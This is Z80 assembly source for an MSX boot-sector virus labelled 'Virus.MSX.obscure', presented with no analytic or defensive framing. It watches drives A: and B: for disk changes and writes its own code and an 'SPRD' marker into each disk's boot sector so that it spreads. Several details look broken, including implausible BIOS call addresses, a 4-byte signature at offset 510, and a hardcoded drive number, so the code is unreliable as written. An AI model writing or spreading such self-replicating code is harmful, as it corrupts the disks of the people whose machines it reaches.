; Virus.MSX.obscure
; compile with PASMO or any Z80 assembler that supports MSX

    ORG 0xC000           ; Program start address in MSX RAM

START:
    DI                   ; Disable interrupts
    LD SP, 0xF380        ; Set up stack pointer in safe RAM
    CALL INIT_BIOS       ; Initialize BIOS

MAIN_LOOP:
    CALL CHECK_DRIVE_A   ; Check drive A: for disk changes
    CALL CHECK_DRIVE_B   ; Check drive B: for disk changes
    CALL DELAY_4_SECONDS ; Add a 4-second delay
    JP MAIN_LOOP         ; Repeat the loop

; ------------------------------
; Subroutine: Initialize BIOS
; ------------------------------
INIT_BIOS:
    LD A, 0x00
    LD (0xFCC1), A       ; Initialize disk change flag for drive A:
    LD (0xFCC2), A       ; Initialize disk change flag for drive B:
    RET

; ------------------------------
; Subroutine: Check Drive A:
; ------------------------------
CHECK_DRIVE_A:
    LD A, 0              ; Drive A: (0 = A:, 1 = B:)
    CALL CHKCHR          ; Check disk change
    JR Z, NO_CHANGE_A    ; No change, skip
    CALL READ_BOOT       ; Read the boot sector
    CALL CHECK_SIGNATURE ; Check for spreading sign
    JR NZ, NO_CHANGE_A   ; If already spread, skip
    CALL UPDATE_BOOT     ; Update boot sector with this program
NO_CHANGE_A:
    RET

; ------------------------------
; Subroutine: Check Drive B:
; ------------------------------
CHECK_DRIVE_B:
    LD A, 1              ; Drive B: (1 = B:)
    CALL CHKCHR          ; Check disk change
    JR Z, NO_CHANGE_B    ; No change, skip
    CALL READ_BOOT       ; Read the boot sector
    CALL CHECK_SIGNATURE ; Check for spreading sign
    JR NZ, NO_CHANGE_B   ; If already spread, skip
    CALL UPDATE_BOOT     ; Update boot sector with this program
NO_CHANGE_B:
    RET

; ------------------------------
; Subroutine: Read Boot Sector
; ------------------------------
READ_BOOT:
    LD A, 0              ; Drive number (stored from CHKCHR call)
    CALL SET_DSK         ; Select the drive
    LD DE, BOOT_BUFFER   ; Address to store the boot sector
    LD BC, 512           ; Boot sector size
    LD HL, 0x0000        ; Logical sector 0 (boot sector)
    CALL RDLOG           ; BIOS Read Logical Sector
    RET

; ------------------------------
; Subroutine: Check for Spreading Signature
; ------------------------------
CHECK_SIGNATURE:
    LD HL, BOOT_BUFFER + 510 ; Location of the signature in the boot sector
    LD DE, SPREAD_SIGN       ; Signature to check ("SPRD")
    LD BC, 4                ; Length of the signature
    CALL MEMCMP             ; Compare memory
    RET

; ------------------------------
; Subroutine: Update Boot Sector
; ------------------------------
UPDATE_BOOT:
    LD HL, BOOT_CODE         ; Address of the boot sector code
    LD DE, BOOT_BUFFER       ; Boot buffer
    LD BC, BOOT_CODE_LEN     ; Length of the boot code
    LDIR                     ; Copy boot code into buffer

    ; Write spreading signature at the end of the boot sector
    LD HL, SPREAD_SIGN       ; Address of the signature
    LD DE, BOOT_BUFFER + 510 ; Location to write the signature
    LD BC, 4                 ; Signature length
    LDIR                     ; Copy the signature

    LD DE, BOOT_BUFFER       ; Boot buffer
    LD BC, 512               ; Boot sector size
    LD HL, 0x0000            ; Logical sector 0 (boot sector)
    CALL WRLOG               ; BIOS Write Logical Sector
    RET

; ------------------------------
; Subroutine: Delay for 4 seconds
; ------------------------------
DELAY_4_SECONDS:
    LD BC, 0xFFFF            ; Approximate delay for 4 seconds
DELAY_LOOP:
    DEC BC
    LD A, B
    OR C
    JR NZ, DELAY_LOOP
    RET

; ------------------------------
; Boot Sector Code
; ------------------------------
BOOT_CODE:
    ; Boot sector logic
    ; The boot code will replicate itself onto other disks
    DI
    LD SP, 0xF380            ; Set stack pointer
    CALL CHECK_DISK_LOOP     ; Begin disk check loop
    JP 0xC000                ; Jump to main program (self-replicating)
    
CHECK_DISK_LOOP:
    LD A, 0                  ; Drive A:
    CALL CHKCHR              ; Check disk change
    JR Z, CHECK_B            ; If no change, check B
    CALL UPDATE_BOOT         ; Update boot sector on A:
CHECK_B:
    LD A, 1                  ; Drive B:
    CALL CHKCHR              ; Check disk change
    JR Z, END_LOOP           ; If no change, continue loop
    CALL UPDATE_BOOT         ; Update boot sector on B:
END_LOOP:
    JP 0xC000                ; Repeat

BOOT_CODE_LEN EQU $ - BOOT_CODE

SPREAD_SIGN:
    DB 'SPRD'                ; Spreading signature (4 bytes)

BOOT_BUFFER EQU 0xE000       ; Buffer in RAM for boot sector

; ------------------------------
; BIOS Calls
; ------------------------------
CHKCHR  EQU 0x1C             ; BIOS Check Disk Change
RDLOG   EQU 0x1D             ; BIOS Read Logical Sector
WRLOG   EQU 0x1E             ; BIOS Write Logical Sector
SET_DSK EQU 0x1F             ; BIOS Set Disk Drive
MEMCMP  EQU 0x2E             ; BIOS Compare Memory
